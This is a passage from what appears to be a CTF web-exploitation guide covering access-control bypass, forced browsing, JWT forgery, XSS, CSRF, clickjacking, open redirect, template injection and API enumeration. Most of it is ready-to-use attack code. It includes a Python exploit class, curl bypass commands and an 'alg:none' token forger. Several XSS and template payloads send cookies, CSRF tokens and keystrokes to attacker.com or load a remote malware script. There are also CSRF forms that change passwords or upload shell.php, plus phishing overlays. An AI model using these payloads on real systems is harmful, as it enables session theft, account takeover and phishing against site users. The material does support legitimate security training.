   - Test with unauthenticated access
   - Verify authorization persists across user sessions
   - Test for forced browsing of admin functions

5. Encoding/Bypass Techniques:
   - Test case variations
   - URL encoding bypasses
   - Null byte injection
   - Path traversal in protected paths
```

#### CTF Exploitation Workflow

Practical authorization exploitation process:

```python
#!/usr/bin/env python3
import requests
import json

class AuthorizationExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.findings = []
    
    def authenticate(self, username, password):
        """Authenticate as specified user"""
        r = self.session.post(f"{self.target_url}/login", 
                             data={'username': username, 'password': password})
        
        if r.status_code == 200:
            print(f"[+] Authenticated as {username}")
            return True
        return False
    
    def enumerate_endpoints(self, endpoint_file):
        """Load endpoints to test"""
        with open(endpoint_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    
    def test_endpoint_access(self, endpoint, method='GET', data=None):
        """Test access to specific endpoint"""
        url = f"{self.target_url}{endpoint}"
        
        try:
            if method == 'GET':
                r = self.session.get(url)
            elif method == 'POST':
                r = self.session.post(url, data=data or {})
            elif method == 'DELETE':
                r = self.session.delete(url)
            else:
                return None
            
            return r.status_code, r.text[:200]
        except Exception as e:
            return None, str(e)
    
    def test_authorization_bypass(self, endpoint, low_priv_user, admin_user):
        """Test authorization bypass between privilege levels"""
        
        # Test as low-privilege user
        self.authenticate(low_priv_user['username'], low_priv_user['password'])
        status_low, content_low = self.test_endpoint_access(endpoint)
        
        # Test as admin user
        self.authenticate(admin_user['username'], admin_user['password'])
        status_admin, content_admin = self.test_endpoint_access(endpoint)
        
        # Compare results
        if status_low == 200 and status_admin == 200:
            if "admin" in content_admin.lower() and "admin" in content_low.lower():
                print(f"[!] VULNERABLE: Low-priv user can access: {endpoint}")
                self.findings.append({
                    'type': 'Vertical Escalation',
                    'endpoint': endpoint,
                    'severity': 'High'
                })
                return True
        
        return False
    
    def test_idor(self, endpoint_template, id_range, own_id):
        """Test IDOR across ID range"""
        
        vulnerable_ids = []
        
        for test_id in id_range:
            if test_id == own_id:
                continue
            
            endpoint = endpoint_template.replace('{id}', str(test_id))
            status, content = self.test_endpoint_access(endpoint)
            
            if status == 200:
                print(f"[!] IDOR FOUND: Can access ID {test_id}")
                vulnerable_ids.append(test_id)
                self.findings.append({
                    'type': 'IDOR',
                    'endpoint': endpoint,
                    'accessible_id': test_id,
                    'severity': 'High'
                })
        
        return vulnerable_ids
    
    def report_findings(self):
        """Generate exploitation report"""
        
        print("\n" + "="*60)
        print("AUTHORIZATION EXPLOITATION REPORT")
        print("="*60)
        
        for finding in self.findings:
            print(f"\n[{finding['severity']}] {finding['type']}")
            print(f"  Endpoint: {finding['endpoint']}")
            if 'accessible_id' in finding:
                print(f"  Accessible ID: {finding['accessible_id']}")
        
        print(f"\n[+] Total vulnerabilities found: {len(self.findings)}")

# Usage
exploit = AuthorizationExploit("http://target.com")

# Test vertical escalation
exploit.authenticate("user", "password")
exploit.test_authorization_bypass(
    "/admin/dashboard",
    {'username': 'user', 'password': 'password'},
    {'username': 'admin', 'password': 'admin'}
)

# Test IDOR
exploit.test_idor("/api/user/{id}/profile", range(1, 50), own_id=100)

# Generate report
exploit.report_findings()
```

Authorization & Access Control testing represents a critical component of security assessments. [Inference] The most common authorization vulnerabilities result from missing or incomplete authorization checks rather than flawed cryptographic implementations. Systematic testing across all endpoints, user roles, and object references typically reveals exploitable authorization weaknesses.

Effective exploitation requires understanding the application's authorization model, identifying privilege levels, and systematically testing each endpoint with different user contexts. CTF scenarios frequently combine multiple authorization vulnerabilities (e.g., IDOR + horizontal escalation to access sensitive data, then vertical escalation to modify it).

---

### Function-Level Access Control Bypass

Function-level access control bypass exploits occur when an application fails to properly verify user permissions before executing sensitive operations. Unlike directory-level restrictions, these bypasses operate at the application logic level where the authentication check exists but is insufficiently restrictive.

#### Direct Object Reference Manipulation

Direct object references allow attackers to access functions by directly calling endpoints or manipulating identifiers. Test by modifying parameters that reference specific operations or resources:

```bash
# Basic parameter modification
curl -b "session=USER_COOKIE" https://target.com/api/admin/delete_user?user_id=123

# Change to different user ID
curl -b "session=USER_COOKIE" https://target.com/api/admin/delete_user?user_id=456

# Test with alternative parameter formats
curl -b "session=USER_COOKIE" https://target.com/api/admin/delete_user?uid=123
curl -b "session=USER_COOKIE" https://target.com/api/admin/delete_user?id=123
```

Burp Suite's Intruder or Repeater allows systematic testing of ID ranges and parameter variations. [Inference] Applications often assume that if you reached the login page, you have permission for all authenticated endpoints—this is a common architectural flaw.

#### Horizontal vs. Vertical Privilege Escalation

Horizontal escalation accesses peer-level resources (viewing another user's data without elevated privileges). Vertical escalation gains higher privilege levels (user accessing admin functions):

```bash
# Horizontal: Access another user's profile
curl -b "session=USER_COOKIE" https://target.com/api/profile/view?user_id=5

# Vertical: Access admin function as regular user
curl -b "session=USER_COOKIE" https://target.com/api/admin/create_account
curl -b "session=USER_COOKIE" https://target.com/api/settings/change_admin_password
```

#### API Endpoint Discovery

Enumerate available endpoints by analyzing JavaScript source code, API documentation leaks, and HTTP traffic:

```bash
# Extract endpoints from JavaScript
strings target_app.js | grep -E "/(api|admin|user|settings|delete|modify)" | sort -u

# Use Burp's target analyzer to map endpoints
# Manually review network tab for xhr/fetch calls

# Passive scanning with Burp Scanner
# Active scanning targeting authorization checks
```

Test each discovered endpoint with your current authentication context. [Inference] Developers frequently copy endpoint handling code without updating authorization checks, creating clusters of vulnerable functions.

#### HTTP Method Exploitation

Some applications restrict certain HTTP methods but overlook others. Test method overrides and alternatives:

```bash
# Standard request denied
curl -X DELETE -b "session=USER_COOKIE" https://target.com/api/user/123

# Try alternative methods
curl -X GET -b "session=USER_COOKIE" https://target.com/api/user/123?_method=DELETE
curl -X POST -b "session=USER_COOKIE" https://target.com/api/user/123 -d "_method=DELETE"
curl -X PATCH -b "session=USER_COOKIE" https://target.com/api/user/123

# Some frameworks support X-HTTP-Method-Override header
curl -X POST -H "X-HTTP-Method-Override: DELETE" -b "session=USER_COOKIE" https://target.com/api/user/123
```

### Forced Browsing

Forced browsing involves attempting to access resources by directly requesting URLs that may not be linked in the application's user interface. This relies on predictable URL patterns and insufficient server-side access controls.

#### Directory Enumeration

Identify common directory structures and application patterns:

```bash
# Using gobuster with common wordlists
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,old,backup

# Recursive scanning with specified depth
gobuster dir -u https://target.com -w wordlist.txt -r -l

# Filter by status codes (focus on 200, 401, 403)
gobuster dir -u https://target.com -w wordlist.txt -s "200,401,403"

# Using ffuf for faster enumeration
ffuf -u https://target.com/FUZZ -w wordlist.txt -fc 404
```

#### Predictable URL Pattern Recognition

Applications often follow consistent naming conventions. Identify patterns in disclosed URLs:

```
/admin/ → /admin/users/, /admin/settings/, /admin/reports/
/api/v1/users/ → /api/v1/groups/, /api/v1/settings/
/backup/ → /backup-2024/, /backup_old/, /backups/
```

Create custom wordlists based on observed patterns:

```bash
# Generate variations
echo "admin settings users groups reports logs database backup" | tr ' ' '\n' | while read word; do echo "/api/$word/"; echo "/$word/"; done > custom_wordlist.txt
```

#### File and Resource Discovery

Enumerate file types and common naming schemes:

```bash
# Discover configuration files
gobuster dir -u https://target.com -w wordlist.txt -x conf,config,ini,json,xml,yml,yaml

# Backup file enumeration
for ext in .bak .backup .old .orig .sql .zip .tar .gz .rar; do
  gobuster dir -u https://target.com -w wordlist.txt -x ${ext#.}
done

# Test common administrative panels
ffuf -u https://target.com/FUZZ -w wordlist.txt -w panels.txt:PANEL
# Contents of panels.txt: admin, administrator, adm, cpanel, control, panel, dashboard, etc.
```

#### Timing and Response Analysis

Leverage response differences to identify hidden resources:

```bash
# Analyze response times and sizes
curl -w "\nStatus: %{http_code}\nSize: %{size_download}\nTime: %{time_total}\n" -o /dev/null -s https://target.com/admin/

# Comparison script
for path in /admin /user /settings /api /backup /test /old; do
  echo "Testing: $path"
  curl -w "%{http_code}\n" -o /dev/null -s https://target.com$path
done
```

### Privilege Confusion

Privilege confusion exploits occur when an application improperly manages user roles, permissions, or status indicators, allowing users to assume higher privilege levels through manipulation.

#### Role-Based Access Control (RBAC) Bypass

Test role parameters in cookies, tokens, and request bodies:

```bash
# Check for role in cookie
curl -b "session=USER_COOKIE; role=admin" https://target.com/admin/dashboard

# Modify JWT token (if JWT is used)
# Decode, modify payload, and re-encode
# Example: Change "role":"user" to "role":"admin"
python3 << 'EOF'
import jwt
import json
import base64

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciJ9.SIGNATURE"
decoded = jwt.decode(token, options={"verify_signature": False})
decoded['role'] = 'admin'
# Note: Re-signing requires the secret key (likely unavailable in CTF)
print(json.dumps(decoded))
EOF

# Test role in POST body
curl -X POST https://target.com/api/action -d "user_id=123&role=admin&action=delete"

# Parameter pollution
curl "https://target.com/api/admin?role=user&role=admin" -b "session=USER_COOKIE"
```

#### Token Manipulation Techniques

Examine token structure and construction:

```bash
# Extract and analyze JWT from request
curl -v https://target.com/api/secure 2>&1 | grep -i "authorization:"

# Decode JWT payload (Python)
python3 << 'EOF'
import base64
import json

jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

parts = jwt_token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

print("Header:", header)
print("Payload:", payload)
EOF

# Test token algorithm downgrade (HS256 to none)
python3 << 'EOF'
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "user123", "role": "admin"}

encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

forged_token = f"{encoded_header}.{encoded_payload}."
print(forged_token)
EOF
```

#### Permission Inheritance and Cascading Checks

Test whether permission checks cascade through application layers:

```bash
# Access parent resource vs. child
curl -b "session=USER_COOKIE" https://target.com/api/organization/123/settings/
curl -b "session=USER_COOKIE" https://target.com/api/organization/123/settings/advanced

# Test intermediate resources
curl -b "session=USER_COOKIE" https://target.com/api/team/456
curl -b "session=USER_COOKIE" https://target.com/api/team/456/members
curl -b "session=USER_COOKIE" https://target.com/api/team/456/members/delete

# Parameter-based hierarchy
curl -b "session=USER_COOKIE" https://target.com/api/resource?parent_id=123&id=456
```

[Inference] When permission checks occur at the parent level only, children often inherit permissions without secondary validation—a common architectural vulnerability.

#### Session and State Manipulation

Exploit improper session management and permission caching:

```bash
# Test with modified session data
curl -b "session=USER_COOKIE; user_level=3; is_admin=true" https://target.com/admin

# Double encoding and encoding bypass
curl "https://target.com/api/admin%252Fdelete" -b "session=USER_COOKIE"

# Null byte injection (older systems)
curl "https://target.com/admin%00.jpg" -b "session=USER_COOKIE"

# Check for permissions cached in local storage or session
# Modify in browser DevTools console
# localStorage.setItem('permissions', JSON.stringify({admin: true}))
```

#### Endpoint Function Mapping

Create a matrix of endpoints, methods, and required permissions:

```bash
#!/bin/bash
# Script to map function-level access

declare -a endpoints=("/api/users" "/api/admin" "/api/settings" "/api/reports")
declare -a methods=("GET" "POST" "PUT" "DELETE")

for endpoint in "${endpoints[@]}"; do
  for method in "${methods[@]}"; do
    echo "Testing: $method $endpoint"
    curl -X $method -w "Status: %{http_code}\n" -o /dev/null -s -b "session=$USER_COOKIE" "https://target.com$endpoint"
  done
done
```

[Inference] Applications with inconsistent permission checking across similar functions often have gaps where the developer forgot to implement authorization on a less obvious endpoint variant.

---

## Client-Side Vulnerabilities

### Reflected XSS Exploitation

Reflected XSS occurs when untrusted user input is immediately returned in the HTTP response without proper sanitization. The payload executes in the victim's browser within the same origin context.

#### Reconnaissance and Payload Crafting

Begin by identifying reflection points—any parameter that appears in the response HTML. Use browser developer tools (F12) to inspect the source and identify where user input is reflected. Common reflection points include query parameters, form data, and URL fragments.

Basic payload structure: `<script>alert('XSS')</script>`. Test this first to confirm the vulnerability exists without executing malicious actions. If this fails, the application likely implements some filtering.

#### Context-Aware Payloads

The execution context determines which payloads work. Use browser console to understand the context:

**HTML context** (user input reflected directly in HTML body): `<img src=x onerror="alert('XSS')">` or `<svg onload="alert('XSS')">`. The `<img>` tag bypasses many filters because it's valid HTML that doesn't require closing tags.

**Attribute context** (input reflected within an HTML attribute): `" onmouseover="alert('XSS')` or `" autofocus onfocus="alert('XSS')`. Close the existing attribute first with a quote, then inject your event handler.

**JavaScript context** (input reflected within a script tag): `';alert('XSS');//` or `${alert('XSS')}`. Break out of the existing string/code block, execute your payload, and comment out the remainder.

**URL context** (input used in `href` or `src` attributes): `javascript:alert('XSS')` or `data:text/html,<script>alert('XSS')</script>`. Some filters may block these, requiring encoding techniques.

#### Filter Evasion Techniques

**Case variation**: `<ScRiPt>alert('XSS')</sCrIpT>`. Many filters perform case-sensitive matching.

**Null byte injection**: `<scri\x00pt>alert('XSS')</script>`. Some parsers may strip null bytes differently than filters expect.

**HTML entity encoding**: `&#60;script&#62;alert('XSS')&#60;/script&#62;`. If the application double-decodes, this may bypass single-decode filters.

**Unicode escaping**: `\u003cscript\u003ealert('XSS')\u003c/script\u003e` in JavaScript contexts. Context-dependent effectiveness.

**Event handler variations**: `<body onload="alert('XSS')">`, `<marquee onstart="alert('XSS')">`, `<details open ontoggle="alert('XSS')">`. Different HTML elements support different events.

#### Exploitation for Information Gathering

Once XSS is confirmed, craft payloads to extract sensitive data:

```javascript
// Steal session cookies
new Image().src='http://attacker.com/log?cookie='+document.cookie;

// Extract CSRF tokens from page source
var token = document.querySelector('[name="csrf_token"]').value;
new Image().src='http://attacker.com/log?token='+token;

// Capture key logging
document.onkeypress = function(e) {
  new Image().src='http://attacker.com/log?key='+e.key;
};
```

Encode payloads using tools like `burp` (built-in encoder) or command-line:

```bash
# URL encoding with Python
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>alert(\"XSS\")</script>'))"

# Base64 encoding
echo '<script>alert("XSS")</script>' | base64
```

### Stored XSS Exploitation

Stored XSS (Persistent XSS) involves injecting malicious scripts that are permanently stored in the application's database and executed each time the stored data is retrieved and rendered.

#### Injection Vectors

Identify all user-controllable data that gets stored: comment sections, profile fields, product reviews, forum posts, chat messages. Use Burp Suite's proxy to intercept requests containing this data and modify payloads before the request reaches the server.

Common storage vectors:

**Form submissions**: Modify POST/PUT requests with XSS payloads in any field that gets stored and displayed.

**File uploads**: If the application stores metadata (filename, description) or serves uploaded content with improper MIME types, inject payloads there.

**API endpoints**: Many applications have API endpoints that accept and store data. Test these with XSS payloads.

**Database import functions**: If the application imports data (CSV, XML), inject payloads during the import process.

#### Persistence and Impact

Unlike Reflected XSS, Stored XSS persists across sessions and affects multiple users. Payloads execute automatically when the stored data is viewed:

```javascript
// Session hijacking via stored XSS
fetch('http://attacker.com/steal?session=' + document.cookie);

// Phishing overlay
var overlay = document.createElement('div');
overlay.innerHTML = '<form action="http://attacker.com/phish"><input name="password" type="password" placeholder="Re-enter password"></form>';
document.body.appendChild(overlay);

// Malware distribution
var script = document.createElement('script');
script.src = 'http://attacker.com/malware.js';
document.body.appendChild(script);
```

#### Detection and Exploitation Workflow

1. Inject distinctive payload: `<script>document.title='XSS_CONFIRMED'</script>`
2. Submit the form/data
3. Navigate to where the data is displayed
4. Verify the payload executed (check page title, console logs, etc.)
5. Replace with functional exploitation payload
6. Document the stored XSS location and trigger point

Use Burp Suite's "Search" feature to find where your injected content appears in application responses.

### DOM-based XSS

DOM-based XSS occurs when JavaScript code itself processes untrusted data unsafely, directly manipulating the DOM without proper sanitization. The vulnerability exists entirely in client-side code.

#### Identifying Vulnerable Patterns

Examine JavaScript code in the application (view source, use Burp Suite's "JavaScript" analysis feature). Look for patterns that directly modify the DOM:

**Dangerous sink functions** (functions that can create/modify DOM elements):

- `innerHTML`: `element.innerHTML = userInput;` — Vulnerable because it parses HTML tags
- `outerHTML`: Similar risk to `innerHTML`
- `document.write()`: Directly writes to document
- `eval()`: Executes arbitrary JavaScript
- `setTimeout()/setInterval()`: With string arguments containing user data
- `Function()`: Constructor executes arbitrary code
- `.insertAdjacentHTML()`: Parses HTML from string

**Vulnerable sources** (where user data originates):

- `window.location` (URL and fragments)
- `document.referrer`
- `document.cookie`
- `localStorage/sessionStorage`
- Form input values
- `window.name`

```javascript
// Vulnerable code example
var userInput = window.location.hash.substring(1);
document.getElementById('output').innerHTML = userInput;

// Exploit: http://target.com/page#<img src=x onerror="alert('XSS')">
```

#### Exploitation Techniques

**URL fragment-based**:

```
http://target.com/page#<svg onload="alert('XSS')">
```

**Query parameter-based**:

```
http://target.com/page?name=<script>alert('XSS')</script>
```

**localStorage-based** (if application stores and renders user data):

```javascript
localStorage.setItem('username', '<img src=x onerror="alert(\'XSS\')">');
// Then navigate to page that renders localStorage data
```

**Reference-based DOM manipulation**:

```javascript
// Vulnerable: 
var param = new URLSearchParams(window.location.search).get('redirect');
window.location = param;

// Exploit:
// ?redirect=javascript:alert('XSS')
```

#### Testing with Burp Suite

1. Use Burp's "DOM Invader" extension (built-in): Right-click page > "Engagement tools" > "DOM Invader"
2. Enable source/sink tracking
3. Interact with application features
4. DOM Invader highlights vulnerable sources and sinks
5. Test canary values (`1234567890`) to identify which sources flow to dangerous sinks

### CSRF Exploitation

Cross-Site Request Forgery exploits a user's authenticated session by tricking them into performing unintended actions on a target application.

#### Vulnerability Assessment

Identify endpoints that perform state-changing operations (POST, PUT, DELETE, PATCH). These are CSRF targets. Check if the application implements CSRF protections:

**CSRF token verification**:

```bash
# Inspect form submission in Burp Suite
# Look for hidden fields like:
# <input type="hidden" name="csrf_token" value="abc123xyz">

# Test by submitting the form without the token
# Remove token parameter and resend via Burp Repeater
# If request succeeds without token, CSRF likely exploitable
```

**Same-Site Cookie attribute**:

```
# Examine Set-Cookie headers in Burp Suite
Set-Cookie: sessionid=value; SameSite=Strict  # Protected
Set-Cookie: sessionid=value; SameSite=Lax     # Partial protection
Set-Cookie: sessionid=value;                  # Vulnerable (no SameSite)
```

**Origin/Referer header validation**:

- Some applications check if the `Referer` header matches the target domain
- This can often be bypassed; test by removing the header in Burp Repeater

#### Exploitation Payloads

**Simple GET-based CSRF**:

```html
<img src="http://target.com/admin/delete-user?id=123" style="display:none;">
```

When a victim visits this page while authenticated to `target.com`, the browser automatically includes their session cookies, and the user is deleted.

**POST-based CSRF**:

```html
<form action="http://target.com/admin/change-password" method="POST" style="display:none;">
  <input type="hidden" name="new_password" value="attacker_password">
  <input type="hidden" name="confirm_password" value="attacker_password">
</form>
<script>
  document.forms[0].submit();
</script>
```

**Multipart form data CSRF**:

```html
<form action="http://target.com/upload" method="POST" enctype="multipart/form-data" style="display:none;">
  <input type="file" name="file">
  <input type="submit">
</form>
<script>
  // Populate file input and submit
  var dataTransfer = new DataTransfer();
  dataTransfer.items.add(new File(['malicious'], 'shell.php', {type: 'text/plain'}));
  document.querySelector('input[type="file"]').files = dataTransfer.files;
  document.forms[0].submit();
</script>
```

**JSON-based CSRF** (if application accepts JSON):

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/api/transfer', true);
xhr.withCredentials = true;  // Include cookies
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
  recipient: 'attacker',
  amount: 1000
}));
</script>
```

#### CSRF Token Bypass Techniques

**Token reuse**: Capture a valid token from one request and reuse it in another. Many applications don't properly invalidate tokens.

**Token manipulation**:

- Test if tokens are predictable (sequential, based on timestamp)
- Try decoding if Base64 encoded
- Check if token validation is case-insensitive

**Null token**: Remove the token parameter entirely; some applications fail open.

**Weak token generation**: Use statistical analysis or cryptographic weaknesses if tokens follow a pattern.

**Token validation bypass**:

```bash
# Test variations in Burp Repeater
# Original: POST /action?csrf_token=abc123
# Bypass attempts:
# POST /action?csrf_token=abc123&csrf_token=invalid
# POST /action?csrf_token=&original_token=abc123
# POST /action?CSRF_TOKEN=abc123 (case variation)
# POST /action (remove token entirely)
```

### Clickjacking

Clickjacking (UI redressing) tricks users into clicking elements they don't intend to by overlaying invisible or disguised UI elements on top of a legitimate page.

#### Vulnerability Detection

Check if the application can be framed using X-Frame-Options header inspection:

```bash
# Use curl to check response headers
curl -I http://target.com/page
# Look for: X-Frame-Options header
# Missing header = Vulnerable
# X-Frame-Options: DENY = Protected
# X-Frame-Options: SAMEORIGIN = Partially protected
# X-Frame-Options: ALLOW-FROM https://trusted.com = Specific origin allowed
```

#### Exploitation Techniques

**Basic clickjacking frame**:

```html
<!DOCTYPE html>
<html>
<head>
  <style>
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0;  /* Invisible */
      z-index: 2;
    }
    body {
      background: #f0f0f0;
    }
  </style>
</head>
<body>
  <h1>Click here to claim your prize!</h1>
  <button style="width: 400px; height: 400px; font-size: 50px;">CLAIM PRIZE</button>
  <iframe src="http://target.com/admin/delete-user?id=123"></iframe>
</body>
</html>
```

When the victim clicks the button, they unknowingly click the delete-user link within the framed page.

**Partial opacity clickjacking**:

```html
<iframe src="http://target.com/admin/settings" 
        style="opacity: 0.3; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10;">
</iframe>
```

The framed content is visible but translucent, making it difficult for users to distinguish the actual clickable elements.

**Cursor tricks**:

```html
<div style="cursor: pointer; position: absolute; top: 100px; left: 100px; width: 200px; height: 50px; z-index: 2;">
  Hover over the "Confirm" button
</div>
<iframe src="http://target.com/admin/confirm-action" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0;"></iframe>
```

**Context-aware clickjacking** (exploiting application-specific UI):

- Map the exact pixel locations of clickable elements in the target application
- Use developer tools to measure button positions
- Position overlay elements at those exact coordinates

### Open Redirect

Open Redirect vulnerabilities allow attackers to redirect users to arbitrary external websites, often used in phishing attacks or credential theft.

#### Discovery

Search for URL parameters that control redirection behavior:

```
/redirect?url=http://external.com
/login?return=http://external.com
/logout?next=http://external.com
/callback?redirect_to=http://external.com
/continue?link=http://external.com
/back?page=http://external.com
```

Test by injecting a known external URL:

```bash
# Burp Repeater or curl
curl "http://target.com/redirect?url=http://attacker.com"
# Check response headers for Location redirect
```

#### Exploitation Techniques

**Direct external URL**:

```
http://target.com/redirect?url=http://attacker.com/phishing
```

**Protocol-based redirects**:

```
# If parameter is used in JavaScript redirect:
http://target.com/redirect?url=javascript:alert('XSS')
http://target.com/redirect?url=data:text/html,<script>alert('XSS')</script>
```

**Filter evasion**:

```
# If whitelist checks for /domain.com pattern
http://target.com/redirect?url=//attacker.com

# Double encoding
http://target.com/redirect?url=%2F%2Fattacker.com

# Unicode encoding
http://target.com/redirect?url=%EF%BC%8F%EF%BC%8Fattacker.com

# Backslash variation (Windows)
http://target.com/redirect?url=\\attacker.com

# IPv6 format
http://target.com/redirect?url=http://[::ffff:192.168.1.1]

# IPv4 integer encoding
http://target.com/redirect?url=http://3232235777 (= 192.168.1.1)

# Null byte injection
http://target.com/redirect?url=http://legit.com%00.attacker.com
```

**[Inference] Meta refresh injection** (if parameter used in HTML meta tags):

```
http://target.com/page?redirect=http://attacker.com
# Application renders: <meta http-equiv="refresh" content="0; url={redirect_param}">
# Then: <meta http-equiv="refresh" content="0; url=http://attacker.com">
```

#### Phishing Exploitation

Create convincing phishing pages at the attacker domain and distribute links using the open redirect:

```
http://target.com/redirect?url=http://attacker.com/fake-login
```

Users trust the initial domain (target.com) and click the link, then encounter the fake login page.

### Client-side Template Injection

Client-side template injection occurs when user input is embedded into client-side template engines (Angular, Vue, React with unsafe rendering) without proper sanitization.

#### Template Engine Detection

Identify which template engine the application uses by examining JavaScript source code and responses:

```bash
# Angular indicators
# {{ }} or ng-app, ng-bind in HTML
# /angular.js or /angular.min.js in script tags

# Vue indicators
# v-app, v-bind, {{ }} interpolation
# /vue.js in script tags

# Handlebars indicators
# {{}} syntax, handlebar-specific directives
# /handlebars.js in script tags
```

#### Angular Template Injection

Angular uses `{{ }}` for expression interpolation. Injecting JavaScript expressions into template context:

```javascript
// Basic payload to test
{{7*7}}
// If rendered as 49, Angular expression evaluation confirmed

// Information disclosure
{{$event}}
{{$root}}
{{constructor}}

// Access Angular scope
{{$scope | json}}
{{$parent | json}}

// Remote code execution (version-dependent)
{{constructor.constructor('alert("XSS")')()}}

// Filter bypass
{{constructor['constructor']('alert("XSS")')()}}
{{(function(){return this})().constructor.prototype.constructor('alert("XSS")')()}}

// Exploit via $http service
{{$http.get('http://attacker.com/steal?data='+document.cookie)}}
```

#### Vue Template Injection

Vue uses similar `{{ }}` syntax but has different exploitation vectors:

```javascript
// Basic test
{{7*7}}

// Access Vue instance
{{$data}}
{{$root}}

// Exploit via constructor
{{constructor}}

// Remote code execution (limited in Vue 3)
{{this.constructor.constructor('alert("XSS")')()}}

// Vulnerable in Vue 2 with eval or Function:
{{eval("alert('XSS')")}}
```

#### Handlebars/Mustache Template Injection

```javascript
// Basic syntax
{{7*7}}

// Function helpers
{{#with constructor}}
  {{#with constructor}}
    {{#if charAt}}
      // RCE payload here
    {{/if}}
  {{/with}}
{{/with}}

// Server-side template injection leading to RCE (if processed server-side)
{{#*inline "x"}}
{{constructor.constructor('alert("XSS")')()}}
{{/inline}}
```

#### Exploitation Workflow

1. Identify template injection point via fuzzing: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
2. Determine template engine from error messages or response patterns
3. Escalate from simple expression evaluation to information disclosure
4. Extract sensitive data (session tokens, configuration, etc.)
5. Attempt remote code execution based on engine capabilities

Use Burp Suite's repeater to test payloads and observe rendering behavior in responses.

---

Related exploitation techniques include Server-Side Template Injection (SSTI), which often provides higher impact remote code execution when templates are processed server-side. Understanding client-side template injection also provides foundation for identifying similar patterns in server-side contexts.

---

## API-Specific Exploitation

### REST API Enumeration

REST API enumeration involves discovering endpoints, parameters, HTTP methods, and understanding API structure through systematic probing and documentation analysis.

**Manual Discovery Techniques**

Start with directory brute-forcing targeting common API paths:

```bash
# Discover API endpoints using ffuf
ffuf -w /usr/share/wordlists/api/api-endpoints.txt -u https://target.com/api/FUZZ -mc 200,201,204,301,302,401,403

# Using gobuster with API-specific patterns
gobuster dir -u https://target.com/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -b 404,500

# Enumerate API versions
ffuf -w <(seq 1 10) -u https://target.com/api/vFUZZ/users -mc all -fc 404

# Test multiple HTTP methods
for method in GET POST PUT DELETE PATCH OPTIONS; do
  curl -X $method https://target.com/api/users -v
done
```

**Automated API Discovery**

Using specialized tools for comprehensive enumeration:

```bash
# Arjun - parameter discovery tool
arjun -u https://target.com/api/users -m GET POST

# Kiterunner - excellent for finding API endpoints
kr scan https://target.com -w routes-large.kite -x 20

# With specific HTTP methods
kr brute https://target.com -w routes-small.kite -A=apiroutes-220328:7000

# Feroxbuster with API extensions
feroxbuster -u https://target.com/api -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x json,xml -C 404,500
```

**Swagger/OpenAPI Discovery**

Common documentation endpoints that expose API structure:

```bash
# Check for API documentation
curl https://target.com/api-docs
curl https://target.com/swagger.json
curl https://target.com/v1/swagger.json
curl https://target.com/v2/api-docs
curl https://target.com/api/swagger/ui/index
curl https://target.com/api/v1/documentation
curl https://target.com/openapi.json
curl https://target.com/docs
curl https://target.com/api/docs

# Download and parse Swagger definition
curl -s https://target.com/swagger.json | jq '.paths | keys[]'

# Extract all endpoints with methods
curl -s https://target.com/swagger.json | jq -r '.paths | to_entries[] | .key as $path | .value | to_entries[] | "\($path) [\(.key)]"'
```

**HTTP Method Testing**

```bash
# Comprehensive OPTIONS request
curl -X OPTIONS https://target.com/api/users -i

# Test for verb tampering
# If POST is blocked, try:
curl -X GET 'https://target.com/api/admin/deleteUser?id=123'
curl -X PUT https://target.com/api/admin/deleteUser -d '{"id":123}'
curl -H "X-HTTP-Method-Override: DELETE" -X POST https://target.com/api/users/123
```

**API Fingerprinting**

Identify the framework and version:

```bash
# Check response headers
curl -I https://target.com/api/users

# Common headers revealing API frameworks:
# X-Powered-By, Server, X-AspNet-Version, X-Framework

# Test error responses for version leaks
curl https://target.com/api/nonexistent -v
curl https://target.com/api/users/../../../../etc/passwd -v
```

### GraphQL Introspection

GraphQL APIs expose their entire schema through introspection queries, which can be abused to map the complete API surface.

**Basic Introspection Query**

```graphql
# Full schema introspection
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

**Using curl for GraphQL Introspection**

```bash
# Basic introspection query via curl
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Get all queries
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
